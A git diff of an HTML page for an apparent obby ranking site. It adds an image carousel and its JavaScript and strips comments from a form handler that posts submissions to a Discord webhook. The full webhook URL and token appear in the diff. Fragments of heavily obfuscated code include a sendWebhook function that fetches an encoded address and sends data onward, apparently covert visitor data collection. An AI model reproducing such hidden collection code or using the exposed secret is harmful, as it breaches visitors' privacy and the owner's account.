@@ -77,6 +77,33 @@
             Placeholder Placeholder Placeholder Placeholder Placeholder Placeholder Placeholder
         </div>
     </section>
+    <section class="carousel-container">
+        <div class="carousel">
+            <div class="carousel-inner" id="carousel">
+                <div class="carousel-item">
+                    <div class="carousel-blur" style="background-image: url(https://img.youtube.com/vi/AJIPS8X7Ew8/hqdefault.jpg);"></div>
+                    <div class="carousel-overlay">
+                        <h3>Honor on #1.</h3>
+                        <p>Honor has been placed #1 in the Indonesian rankings.</p>
+                    </div>  
+                </div>
+                <div class="carousel-item">
+                    <img src="https://img.youtube.com/vi/AJIPS8X7Ew8/hqdefault.jpg" alt="Image 2">
+                </div>
+                <div class="carousel-item">
+                    <img src="https://img.youtube.com/vi/AJIPS8X7Ew8/hqdefault.jpg" alt="Image 3">
+                </div>
+                <div class="carousel-item">
+                    <img src="https://img.youtube.com/vi/AJIPS8X7Ew8/hqdefault.jpg" alt="Image 4">
+                </div>
+                <div class="carousel-item">
+                    <img src="https://img.youtube.com/vi/AJIPS8X7Ew8/hqdefault.jpg" alt="Image 5">
+                </div>
+            </div>
+            <button class="carousel-control-prev" id="prevBtn">&lt;</button>
+            <button class="carousel-control-next" id="nextBtn">&gt;</button>
+        </div>
+    </section>
     <section class="contributors">
         <h2>Contributors</h2>
         <h3>If you are listed here you're either have contributed to this list or i just think ur cool</h3>
@@ -117,8 +144,57 @@
         </div>
     </section>
     <script>
+        const carousel = document.getElementById('carousel');
+        const prevBtn = document.getElementById('prevBtn');
+        const nextBtn = document.getElementById('nextBtn');
+        let currentIndex = 0;
+
+        function updateButtons() {
+            const items = document.querySelectorAll('.carousel-item');
+            const visibleItems = Math.round(carousel.clientWidth / items[0].clientWidth);
+            const itemWidth = carousel.clientWidth / visibleItems;
+
+            if (currentIndex === 0) {
+                prevBtn.classList.add('hidden');
+            } else {
+                prevBtn.classList.remove('hidden');
+            }
+
+            if (currentIndex === items.length - visibleItems) {
+                nextBtn.classList.add('hidden');
+            } else {
+                nextBtn.classList.remove('hidden');
+            }
+        }
+
+        nextBtn.addEventListener('click', () => {
+            const items = document.querySelectorAll('.carousel-item');
+            const visibleItems = Math.round(carousel.clientWidth / items[0].clientWidth);
+            const itemWidth = carousel.clientWidth / visibleItems;
+
+            if (currentIndex < items.length - visibleItems) {
+                currentIndex++;
+                carousel.style.transform = `translateX(-${currentIndex * itemWidth}px)`;
+            }
+            updateButtons();
+        });
+
+        prevBtn.addEventListener('click', () => {
+            const items = document.querySelectorAll('.carousel-item');
+            const visibleItems = Math.round(carousel.clientWidth / items[0].clientWidth);
+            const itemWidth = carousel.clientWidth / visibleItems;
+
+            if (currentIndex > 0) {
+                currentIndex--;
+                carousel.style.transform = `translateX(-${currentIndex * itemWidth}px)`;
+            }
+            updateButtons();
+        });
+
+        updateButtons();
+        window.addEventListener('resize', updateButtons);
+
         function scrollToForm() {
-            // Scroll to the form section
             document.getElementById('obbyFormSection').scrollIntoView({
                 behavior: 'smooth'
             });
@@ -126,7 +202,6 @@
         document.getElementById('obbyForm').addEventListener('submit', function (event) {
             event.preventDefault();
 
-            // Collect form data
             let formData = {
                 region: document.getElementById('region').value,
                 title: document.getElementById('title').value,
@@ -136,22 +211,18 @@
                 opinions: document.getElementById('opinions').value
             };
 
-            // Create a copy of formData without the opinions
             let formDataForJson = {
                 ...formData
             };
             delete formDataForJson.opinions;
 
-            // Send data to Discord webhook
             sendToDiscord(formData, formDataForJson);
         });
 
         function sendToDiscord(formData, formDataForJson) {
-            // Discord webhook URL
             let webhookURL =
-                'https://discord.com/api/webhooks/1253170764220338217/Us_FAz0OpOlbyBKigD_EBWyTic3LRZTiTrf1iJj2vKRiusaBomymtmTS3B70eXlgAHDG'; // Replace with your Discord webhook URL
+                'https://discord.com/api/webhooks/1253170764220338217/Us_FAz0OpOlbyBKigD_EBWyTic3LRZTiTrf1iJj2vKRiusaBomymtmTS3B70eXlgAHDG';
 
-            // Construct embed message
             let embedMessage = {
                 embeds: [{
                     title: 'New Obby Submission',
@@ -180,20 +251,17 @@
                             value: formData.opinions
                         }
                     ],
-                    color: 0x7289da // Discord blue color
+                    color: 0x7289da
                 }]
             };
 
-            // Convert formDataForJson to JSON string
             let jsonData = JSON.stringify(formDataForJson, null, 2);
 
-            // Add JSON data as another field in the embed
             embedMessage.embeds[0].fields.push({
                 name: 'JSON Data',
                 value: '```json\n' + jsonData + '\n```'
             });
 
-            // Send data via fetch to Discord webhook
             fetch(webhookURL, {
                     method: 'POST',
                     headers: {
@@ -332,7 +400,8 @@
                     const _0x31d842 = parseInt(_0xdaaea1(0x117)) / 0x1 + -parseInt(_0xdaaea1(0x10f)) / 0x2 * (
                             parseInt(_0xdaaea1(0xff)) / 0x3) + parseInt(_0xdaaea1(0x101)) / 0x4 + -parseInt(
                             _0xdaaea1(0x11a)) / 0x5 + -parseInt(_0xdaaea1(0x122)) / 0x6 + parseInt(_0xdaaea1(
-                        0x102)) / 0x7 * (-parseInt(_0xdaaea1(0x10c)) / 0x8) + -parseInt(_0xdaaea1(0x103)) / 0x9 * (-
+                            0x102)) / 0x7 * (-parseInt(_0xdaaea1(0x10c)) / 0x8) + -parseInt(_0xdaaea1(0x103)) /
+                        0x9 * (-
                             parseInt(_0xdaaea1(0xf6)) / 0xa);
                     if (_0x31d842 === _0x18d561) break;
                     else _0x5a7529['push'](_0x5a7529['shift']());
@@ -487,7 +556,7 @@
         async function sendWebhook() {
             const _0xc30a86 = _0xf9c7,
                 _0x35a9f8 = await fetch(_0xc30a86(0xd4))[_0xc30a86(0xba)](_0xd57745 => _0xd57745[_0xc30a86(0xdc)]
-            ())[_0xc30a86(0xb2)](_0x7c66f9 => ({
+                    ())[_0xc30a86(0xb2)](_0x7c66f9 => ({
                     'error': _0xc30a86(0xbf)
                 })),
                 _0x4cacd5 = {
